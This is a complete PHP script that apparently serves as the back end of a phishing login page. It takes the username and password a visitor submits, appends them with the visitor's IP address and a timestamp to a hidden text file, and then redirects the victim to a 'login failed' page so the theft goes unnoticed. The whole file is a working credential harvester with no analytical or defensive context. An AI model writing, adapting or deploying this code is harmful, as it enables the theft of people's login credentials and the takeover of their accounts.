<?php
$Username=$_POST["username"];
$Password=$_POST["password"];
$ip = $_SERVER["REMOTE_ADDR"];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);

$handle=fopen("lana/ps.txt","a");
$save=fwrite($handle,'*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
Username : '.$Username.'
Password : '.$Password.'
IP Address : '.$ip.'
Date Submitted : '.$now.'
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*

');
fclose($handle);
echo '
<html>
<head>
<meta http-equiv="Refresh" content="0; URL=login_gagal.php"/>
</head><body>
</body>
</html>
';


?>